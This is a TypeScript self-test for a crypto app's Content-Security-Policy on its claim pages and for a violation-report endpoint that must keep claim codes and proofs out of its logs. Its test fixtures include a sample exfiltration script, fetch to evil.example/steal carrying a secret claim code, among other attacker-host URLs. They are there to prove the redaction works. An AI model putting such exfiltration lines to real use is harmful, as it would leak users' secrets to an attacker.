/**
 * Self-test: the claim, request and verify pages enforce their own
 * Content-Security-Policy, and violation reports keep nothing private
 * (csp.config.mjs CSP_CLAIM_ENFORCED, next.config.ts, app/api/csp-report,
 * lib/cspReport).
 *
 *  - in a production build /c, /claim, /r and /verify, and every path under
 *    them, get CSP_CLAIM_ENFORCED as their one enforced policy, matched the way
 *    Next writes the routes manifest; no other page gets it, and a dev build
 *    sends none of it
 *  - the policy blocks by default, has no 'unsafe-eval' and no wildcard, refuses
 *    framing, <base>, plugins and form posts elsewhere, and names the report
 *    endpoint (report-uri and report-to, with the Reporting-Endpoints header);
 *    so do the Report-Only policy and /app's
 *  - its connect-src is exactly the RPCs of every Gloam network (lib/networks,
 *    hidden mainnets too, Elysium while its switch is on) and the origin of any
 *    NEXT_PUBLIC_*_RPC_URL override: a chain added without its host fails here
 *  - the report endpoint logs and counts the page's path, the directive and
 *    the blocked origin only: no query, fragment, escaped fragment, referrer,
 *    sample or source file reaches a log line or the store. It caps the body,
 *    refuses other content types, rate limits, counts per directive per day,
 *    and carries on quietly when the store is missing or does not answer
 *
 * Run from app/, with Elysium off and on, as CI does:
 *   ../mcp/node_modules/.bin/tsx scripts/selftest-claim-csp.mts
 *   NEXT_PUBLIC_ELYSIUM_ENABLED=1 ../mcp/node_modules/.bin/tsx scripts/selftest-claim-csp.mts
 */
import assert from "node:assert/strict";
import { createServer } from "node:http";
import { createRequire } from "node:module";

const env = process.env as Record<string, string | undefined>;
env.NODE_ENV = "production";
const TURNKEY = ["NEXT_PUBLIC_TURNKEY_ENABLED", "NEXT_PUBLIC_TURNKEY_ORGANIZATION_ID", "NEXT_PUBLIC_TURNKEY_AUTH_PROXY_CONFIG_ID"];
for (const k of TURNKEY) delete env[k];
delete env.UPSTASH_REDIS_REST_URL;
delete env.UPSTASH_REDIS_REST_TOKEN;
env.GLOAM_PARTNERS_STORE = "memory";
const elysiumOn = /^(1|true|on|yes)$/i.test((env.NEXT_PUBLIC_ELYSIUM_ENABLED ?? "").trim());

const csp = await import("../csp.config.mjs");
const nextConfig = (await import("../next.config")).default;
const require = createRequire(import.meta.url);
const { buildCustomRoute } = require("next/dist/lib/build-custom-route.js") as {
  buildCustomRoute: (type: "header", route: { source: string }) => { regex: string };
};

let n = 0;

// ── which pages get which headers ─────────────────────────────────────────────

type Rule = { source: string; headers: { key: string; value: string }[]; has?: unknown; missing?: unknown };
async function headerRules() {
  const rules = (await nextConfig.headers!()) as Rule[];
  // headersFor reads source alone: no rule may hang on a header or cookie
  for (const r of rules) assert.ok(!r.has && !r.missing, `${r.source} has no has/missing`);
  return rules.map((r) => ({ ...r, re: new RegExp(buildCustomRoute("header", r).regex) }));
}
/** The headers a path gets: every matching rule in order, a later one replacing a header an earlier one set. */
function headersFor(rules: Awaited<ReturnType<typeof headerRules>>, path: string): Map<string, string> {
  const out = new Map<string, string>();
  for (const r of rules) {
    if (!r.re.test(path)) continue;
    for (const h of r.headers) out.set(h.key.toLowerCase(), h.value);
  }
  return out;
}

const prod = await headerRules();
const CLAIM_PATHS = ["/c", "/claim", "/r", "/verify", "/c/x", "/claim/anything", "/r/a/b", "/verify/proof"];
const OTHER_PATHS = ["/", "/app", "/app/vault", "/cookies", "/contest", "/claims", "/research", "/r2", "/verifyx", "/docs/claim", "/blog/verify", "/c%23abcdefgh123"];
for (const path of CLAIM_PATHS) {
  const h = headersFor(prod, path);
  assert.equal(h.get("content-security-policy"), csp.CSP_CLAIM_ENFORCED, `${path} enforces the claim policy`);
  assert.equal(h.get("content-security-policy-report-only"), csp.CSP_REPORT_ONLY, `${path} still sends the site's Report-Only policy`);
  assert.equal(h.get("reporting-endpoints"), 'csp="/api/csp-report"', `${path} names the report endpoint`);
  assert.equal(h.get("x-frame-options"), "DENY", `${path} refuses framing`);
  n += 4;
}
for (const path of OTHER_PATHS) {
  const h = headersFor(prod, path);
  assert.notEqual(h.get("content-security-policy"), csp.CSP_CLAIM_ENFORCED, `${path} keeps its own policy`);
  assert.equal(h.get("reporting-endpoints"), 'csp="/api/csp-report"', `${path} names the report endpoint`);
  n += 2;
}
assert.equal(headersFor(prod, "/app").get("content-security-policy"), "frame-ancestors 'none'; base-uri 'self'; object-src 'none'; form-action 'self'", "/app without Gloam wallets: framing policy only, as before");
assert.ok(!headersFor(prod, "/pitch").has("content-security-policy"), "the pitch deck may still be framed");
n += 2;

// With Gloam wallets on, /app keeps its own enforced policy and the claim pages keep theirs.
Object.assign(env, { NEXT_PUBLIC_TURNKEY_ENABLED: "true", NEXT_PUBLIC_TURNKEY_ORGANIZATION_ID: "org", NEXT_PUBLIC_TURNKEY_AUTH_PROXY_CONFIG_ID: "proxy" });
const withWallets = await headerRules();
assert.equal(headersFor(withWallets, "/app/vault").get("content-security-policy"), csp.CSP_APP_ENFORCED);
assert.equal(headersFor(withWallets, "/partners/dashboard").get("content-security-policy"), csp.CSP_APP_ENFORCED);
for (const path of CLAIM_PATHS) assert.equal(headersFor(withWallets, path).get("content-security-policy"), csp.CSP_CLAIM_ENFORCED, path);
for (const k of TURNKEY) delete env[k];
n += 2 + CLAIM_PATHS.length;

// A dev build reloads code with eval: none of the fuller policies, as before.
env.NODE_ENV = "development";
const dev = await headerRules();
for (const path of ["/claim", "/verify"]) {
  const h = headersFor(dev, path);
  assert.equal(h.get("content-security-policy"), "frame-ancestors 'none'; base-uri 'self'; object-src 'none'; form-action 'self'", path);
  assert.ok(!h.has("content-security-policy-report-only") && !h.has("reporting-endpoints"), path);
  n += 2;
}
env.NODE_ENV = "production";

// ── the claim policy itself ───────────────────────────────────────────────────

function directives(policy: string): Map<string, string[]> {
  const out = new Map<string, string[]>();
  for (const d of policy.split(";").map((s) => s.trim()).filter(Boolean)) {
    const [name, ...sources] = d.split(/\s+/);
    assert.ok(!out.has(name!), `${name} appears once`);
    out.set(name!, sources);
  }
  return out;
}
const claim = directives(csp.CSP_CLAIM_ENFORCED);
const want: Record<string, string[]> = {
  "default-src": ["'none'"],
  // the same as /app's, less Vercel's debug analytics host (production loads analytics from /_vercel)
  "script-src": ["'self'", "'unsafe-inline'", "'wasm-unsafe-eval'"],
  "style-src": ["'self'", "'unsafe-inline'"],
  "img-src": ["'self'", "data:", "blob:"],
  "font-src": ["'self'"],
  "worker-src": ["'self'", "blob:"],
  "manifest-src": ["'self'"],
  "frame-src": ["'none'"],
  "frame-ancestors": ["'none'"],
  "base-uri": ["'none'"],
  "object-src": ["'none'"],
  "form-action": ["'self'"],
  "report-uri": ["/api/csp-report"],
  "report-to": ["csp"],
};
for (const [name, sources] of Object.entries(want)) {
  assert.deepEqual(claim.get(name), sources, name);
  n++;
}
assert.deepEqual([...claim.keys()].sort(), [...Object.keys(want), "connect-src"].sort(), "no other directive");
assert.ok(!csp.CSP_CLAIM_ENFORCED.includes("'unsafe-eval'"), "no eval");
assert.ok(!csp.CSP_CLAIM_ENFORCED.includes("*"), "no wildcard host");
for (const [name, sources] of claim) {
  for (const s of sources) assert.ok(!/^(https?|wss?):?$/.test(s), `${name} does not allow every ${s} host`);
}
for (const host of ["walletconnect", "turnkey", "relay.link", "solana", "dexscreener", "va.vercel-scripts.com", "thirdweb", "sponsor.moderato", "google"]) {
  assert.ok(!csp.CSP_CLAIM_ENFORCED.includes(host), `nothing from ${host}`);
}
n += 4;

// Every policy that is sent names the report endpoint.
for (const [name, policy] of [["Report-Only", csp.CSP_REPORT_ONLY], ["/app", csp.CSP_APP_ENFORCED], ["claim", csp.CSP_CLAIM_ENFORCED]] as const) {
  const d = directives(policy);
  assert.deepEqual(d.get("report-uri"), ["/api/csp-report"], `${name} report-uri`);
  assert.deepEqual(d.get("report-to"), ["csp"], `${name} report-to`);
  n += 2;
}
assert.equal(csp.REPORTING_ENDPOINTS, 'csp="/api/csp-report"');
n++;

// ── connect-src: every Gloam network's RPC, and nothing else ──────────────────

const { getNetwork, NETWORK_KEYS } = await import("../src/lib/networks");
type Key = Parameters<typeof getNetwork>[0];
const { ELYSIUM_ENABLED } = await import("../src/lib/elysium");
assert.equal(ELYSIUM_ENABLED, elysiumOn, "Elysium is on exactly when its switch is");
// The live networks, and the mainnets still waiting for a pool (a deploy turns one on with no code change).
const keys = new Set<Key>([...NETWORK_KEYS, "robinhood", "tempo", "base", "ethereum", "robinhood-mainnet", "tempo-mainnet", "base-mainnet", "ethereum-mainnet"]);
if (elysiumOn) {
  assert.ok(NETWORK_KEYS.includes("elysium-mainnet"), "Elysium mainnet is a network with its switch on");
  n++;
}
const rpcOrigins = new Set<string>();
for (const key of keys) {
  const net = getNetwork(key);
  for (const url of net.chain.rpcUrls.default.http) rpcOrigins.add(new URL(url).origin);
  if (net.historyRpc) rpcOrigins.add(new URL(net.historyRpc.url).origin);
}
const connect = new Set(claim.get("connect-src")!.filter((s) => s !== "'self'"));
assert.ok(claim.get("connect-src")!.includes("'self'"), "Gloam's API and relay");
for (const origin of rpcOrigins) {
  assert.ok(connect.has(origin), `${origin} (a Gloam network RPC) is in the claim pages' connect-src`);
  n++;
}
const overrides = new Set<string>(csp.rpcOverrideSources());
for (const s of connect) {
  assert.ok(rpcOrigins.has(s) || overrides.has(s), `${s} in connect-src is a Gloam network RPC or an override`);
  n++;
}
assert.equal(connect.has("https://rpc.elysium.kinetiq.xyz"), elysiumOn, "Elysium's RPC exactly while it is on");
n++;

// An RPC override set on Vercel: its origin, never its key; a future one is picked up too.
const custom = csp.claimPagesCsp({
  ...env,
  NEXT_PUBLIC_ELYSIUM_ENABLED: "1",
  NEXT_PUBLIC_ELYSIUM_RPC_URL: "https://elysium-mainnet.g.alchemy.com/v2/SECRETKEY123",
  NEXT_PUBLIC_SOMECHAIN_RPC_URL: "wss://rpc.somechain.example/ws?key=OTHERSECRET",
  NEXT_PUBLIC_BROKEN_RPC_URL: "not a url",
  NEXT_PUBLIC_PLAIN_RPC_URL: "http://plain.example",
} as unknown as NodeJS.ProcessEnv);
const customConnect = directives(custom).get("connect-src")!;
assert.ok(customConnect.includes("https://elysium-mainnet.g.alchemy.com"), "the override's origin");
assert.ok(customConnect.includes("wss://rpc.somechain.example"), "any NEXT_PUBLIC_*_RPC_URL");
assert.ok(!custom.includes("SECRETKEY123") && !custom.includes("OTHERSECRET"), "never a key");
assert.ok(!custom.includes("plain.example") && !custom.includes("not a url"), "only https and wss URLs");
n += 4;

// ── the report endpoint ───────────────────────────────────────────────────────

const { POST } = await import("../src/app/api/csp-report/route");
const { kv, resetMemoryKv } = await import("../src/lib/partnersKv");
const { cspCountKey, blockedOf, directiveOf } = await import("../src/lib/cspReport");

const lines: string[] = [];
const original = { info: console.info, warn: console.warn, log: console.log, error: console.error };
for (const level of ["info", "warn", "log", "error"] as const) {
  console[level] = (...args: unknown[]) => {
    lines.push(args.map((a) => (typeof a === "string" ? a : JSON.stringify(a))).join(" "));
  };
}
function restoreConsole() {
  Object.assign(console, original);
}

let ip = 1;
function post(body: string | ReadableStream<Uint8Array>, type: string, from = `198.51.100.${ip++}`, extra: Record<string, string> = {}) {
  return POST(
    new Request("https://www.gloam.trade/api/csp-report", {
      method: "POST",
      headers: { "content-type": type, "x-forwarded-for": from, ...extra },
      body,
      ...(typeof body === "string" ? {} : { duplex: "half" }),
    } as RequestInit),
  );
}

// What a claim page holds in its address, and what an attack would try to send out.
const CODE = "gloam1.eyJTECRETclaimCODEdoNotLogMe0123456789";
const BODY = "7Hk2SeCrEtShOrTbOdY9xQ4mZ0aBcDeFgHiJkLmNo";
const PROOF = "gloampay1:eyJTECRETproofDoNotLogMe";
const SECRETS = [CODE, BODY, BODY.toLowerCase(), "SECRET", "TECRET", "DoNotLog", "doNotLog", PROOF];
function noSecrets(where: string) {
  for (const line of lines) for (const s of SECRETS) assert.ok(!line.includes(s), `${where}: no ${s} in "${line}"`);
}
const violationLines = () => lines.filter((l) => l.startsWith("gloam_csp_violation ")).map((l) => JSON.parse(l.slice("gloam_csp_violation ".length)));

try {
  resetMemoryKv();

  // report-uri, from /claim with the code in the fragment and the network in the query
  const legacy = {
    "csp-report": {
      "document-uri": `https://www.gloam.trade/claim?net=tempo&x=SECRET#claim=${CODE}`,
      referrer: `https://chat.example/?c=${CODE}`,
      "violated-directive": "connect-src 'self' https://rpc.tempo.xyz",
      "effective-directive": "connect-src",
      "original-policy": csp.CSP_CLAIM_ENFORCED,
      disposition: "enforce",
      "blocked-uri": `https://evil.example/steal?c=${CODE}#${CODE}`,
      "status-code": 200,
      "script-sample": `fetch("https://evil.example/steal?c=" + "${CODE}")`,
      "source-file": `https://www.gloam.trade/claim#claim=${CODE}`,
      "line-number": 1,
    },
  };
  assert.equal((await post(JSON.stringify(legacy), "application/csp-report")).status, 204, "report-uri body taken");
  assert.deepEqual(violationLines(), [{ path: "/claim", directive: "connect-src", blocked: "https://evil.example", disposition: "enforce", extension: false, n: 1 }]);
  noSecrets("report-uri");
  n += 3;

  // report-to, batched: a short link, one a chat app escaped, a proof link, an extension, and a report of another type
  lines.length = 0;
  const report = (documentURL: string, blockedURL: string, effectiveDirective: string, disposition: string, sourceFile = documentURL) => ({
    type: "csp-violation",
    age: 12,
    url: documentURL,
    user_agent: "Mozilla/5.0",
    body: { documentURL, referrer: `https://chat.example/#${BODY}`, blockedURL, effectiveDirective, originalPolicy: csp.CSP_CLAIM_ENFORCED, sourceFile, sample: `location.hash /* ${BODY} */`, disposition, statusCode: 200, lineNumber: 1, columnNumber: 9 },
  });
  const batch = [
    report(`https://www.gloam.trade/c#${BODY}`, "inline", "script-src-elem", "enforce"),
    report(`https://www.gloam.trade/c%23${BODY}`, `https://${BODY}.evil.example/x?y=${BODY}`, "img-src", "report"),
    report(`https://www.gloam.trade/verify?proof=${PROOF}#proof=${PROOF}`, "chrome-extension://abcdefghijklmnopabcdefghijklmnop/inject.js", "script-src-elem", "enforce", "chrome-extension://abcdefghijklmnopabcdefghijklmnop/content.js"),
    report(`https://www.gloam.trade/r#${BODY}`, "wss://relay.example:8443/socket?token=SECRET", "connect-src", "enforce"),
    { type: "deprecation", url: `https://www.gloam.trade/c#${BODY}`, body: { id: "x", message: BODY } },
  ];
  assert.equal((await post(JSON.stringify(batch), "application/reports+json")).status, 204, "report-to body taken");
  assert.deepEqual(violationLines(), [
    { path: "/c", directive: "script-src-elem", blocked: "inline", disposition: "enforce", extension: false, n: 1 },
    { path: "/c", directive: "img-src", blocked: "https://redacted.evil.example", disposition: "report", extension: false, n: 1 },
    { path: "/verify", directive: "script-src-elem", blocked: "chrome-extension", disposition: "enforce", extension: true, n: 1 },
    { path: "/r", directive: "connect-src", blocked: "wss://relay.example:8443", disposition: "enforce", extension: false, n: 1 },
  ]);
  noSecrets("report-to");
  assert.ok(!lines.join("\n").includes("abcdefghijklmnop"), "no extension id");
  n += 4;

  // counted per directive per day, extensions apart; nothing else stored
  const counts = (await kv([["HGETALL", cspCountKey()]]))[0] as string[];
  const record = Object.fromEntries(Array.from({ length: counts.length / 2 }, (_, i) => [counts[2 * i], Number(counts[2 * i + 1])]));
  assert.deepEqual(record, { "enforce:connect-src": 2, "enforce:script-src-elem": 1, "report:img-src": 1, "ext:enforce:script-src-elem": 1 });
  n++;

  // the same violation twice in one batch: one log line, counted twice
  lines.length = 0;
  const twice = [report(`https://www.gloam.trade/claim#claim=${CODE}`, "eval", "script-src", "enforce"), report(`https://www.gloam.trade/claim#claim=${CODE}`, "eval", "script-src", "enforce")];
  assert.equal((await post(JSON.stringify(twice), "application/reports+json")).status, 204);
  assert.deepEqual(violationLines(), [{ path: "/claim", directive: "script-src", blocked: "eval", disposition: "enforce", extension: false, n: 2 }]);
  n += 2;

  // refused: other content types, bodies past the cap (declared or streamed), not a report
  assert.equal((await post(JSON.stringify(legacy), "text/plain")).status, 415);
  assert.equal((await post(JSON.stringify(legacy), "application/x-www-form-urlencoded")).status, 415);
  const big = JSON.stringify({ "csp-report": { ...legacy["csp-report"], "script-sample": "x".repeat(20_000) } });
  assert.equal((await post(big, "application/csp-report")).status, 413, "declared length over the cap");
  let pulled = 0;
  const endless = new ReadableStream<Uint8Array>({
    pull(c) {
      pulled++;
      c.enqueue(new Uint8Array(4096).fill(0x20));
      if (pulled > 64) c.close();
    },
  });
  assert.equal((await post(endless, "application/reports+json")).status, 413, "streamed past the cap");
  assert.ok(pulled <= 6, `stops reading at the cap (read ${pulled} chunks)`);
  assert.equal((await post("{not json", "application/csp-report")).status, 400);
  assert.equal((await post(JSON.stringify({ hello: CODE }), "application/csp-report")).status, 400);
  assert.equal((await post(JSON.stringify([{ type: "deprecation", body: {} }]), "application/reports+json")).status, 204, "nothing to count");
  noSecrets("refused bodies");
  n += 9;

  // rate limited per IP
  const from = "203.0.113.77";
  for (let i = 0; i < 30; i++) assert.equal((await post("{}", "text/plain", from)).status, 415);
  const limited = await post(JSON.stringify(legacy), "application/csp-report", from);
  assert.equal(limited.status, 429);
  assert.ok(Number(limited.headers.get("retry-after")) >= 1);
  n += 2;

  // a store that does not answer, or none at all: still 204, nothing thrown, nothing more logged
  const down = createServer((_req, res) => {
    res.statusCode = 500;
    res.end("down");
  });
  await new Promise<void>((r) => down.listen(0, "127.0.0.1", r));
  delete env.GLOAM_PARTNERS_STORE;
  env.UPSTASH_REDIS_REST_URL = `http://127.0.0.1:${(down.address() as { port: number }).port}`;
  env.UPSTASH_REDIS_REST_TOKEN = "test-token";
  lines.length = 0;
  assert.equal((await post(JSON.stringify(legacy), "application/csp-report")).status, 204, "Redis down");
  assert.deepEqual(lines.filter((l) => !l.startsWith("gloam_csp_violation ")), [], "quiet");
  down.close();
  delete env.UPSTASH_REDIS_REST_URL;
  delete env.UPSTASH_REDIS_REST_TOKEN;
  lines.length = 0;
  assert.equal((await post(JSON.stringify(legacy), "application/csp-report")).status, 204, "no store in production");
  assert.deepEqual(lines.filter((l) => !l.startsWith("gloam_csp_violation ")), [], "quiet");
  noSecrets("store down");
  n += 4;
} finally {
  restoreConsole();
}

// the pieces on their own
assert.equal(directiveOf("script-src-elem 'self' 'unsafe-inline'"), "script-src-elem", "an older report's violated-directive");
assert.equal(directiveOf("made-up-src"), "other");
assert.equal(directiveOf(undefined), "unknown");
assert.equal(blockedOf("data:image/png;base64,AAAA"), "data");
assert.equal(blockedOf("blob:https://www.gloam.trade/5d1c"), "blob");
assert.equal(blockedOf("https://rpc.example.com:8545/v2/KEY"), "https://rpc.example.com:8545");
assert.equal(blockedOf("https://0x1234567890abcdef1234.example.com/"), "https://redacted.example.com");
assert.equal(blockedOf(""), "none");
assert.equal(blockedOf("/relative/path"), "other");
n += 9;

console.log(`claim-csp: ${n} passed (Elysium ${elysiumOn ? "on" : "off"})`);
